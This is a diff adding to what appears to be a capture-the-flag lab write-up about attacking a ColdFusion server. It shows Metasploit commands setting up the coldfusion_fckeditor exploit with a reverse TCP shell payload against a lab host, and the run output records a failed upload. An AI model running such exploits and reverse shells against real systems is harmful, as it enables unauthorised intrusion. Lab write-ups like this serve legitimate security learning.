@@ -163,6 +163,52 @@ msf6 exploit(multi/http/coldfusion_ckeditor_file_upload) > run
 
 Now i checked the request it made in burp suite proxy history
 
-And found the error 
+And tried it again and it uploaded
+![image](https://user-images.githubusercontent.com/113513376/213619722-86fe1441-b321-49ff-966b-9707507528c5.png)
+
+But another problem 
+
+It doesn't really upload it needs another http form of request (GET) to work which i can't chain using burp
+
+So i went back to msf and try other exploit
+
+```
+msf6 exploit(windows/http/coldfusion_fckeditor) > use exploit/windows/http/coldfusion_fckeditor
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(windows/http/coldfusion_fckeditor) > set rport 8500
+rport => 8500
+msf6 exploit(windows/http/coldfusion_fckeditor) > set rhosts 10.10.10.11
+rhosts => 10.10.10.11
+msf6 exploit(windows/http/coldfusion_fckeditor) > set proxies http:127.0.0.1:8080
+proxies => http:127.0.0.1:8080
+msf6 exploit(windows/http/coldfusion_fckeditor) > set lhost tun0
+lhost => tun0
+msf6 exploit(windows/http/coldfusion_fckeditor) > 
+```
+
+On running it 
+
+```
+msf6 exploit(windows/http/coldfusion_fckeditor) > run
+
+[*] Started reverse TCP handler on 10.10.16.7:4444 
+[*] Sending our POST request...
+[-] Upload Failed...
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/http/coldfusion_fckeditor) > 
+
+```
+
+Failed again 
+
+The request made 
+![image](https://user-images.githubusercontent.com/113513376/213620781-0fa8eebf-801e-48a6-9f41-037911b08adf.png)
+
+So it seems like this is the right exploit to use cause it is chaining the required request method and also sending it to the right path of the upload.crm
+
+So guess its time to debug lol
+
+
+
 
 
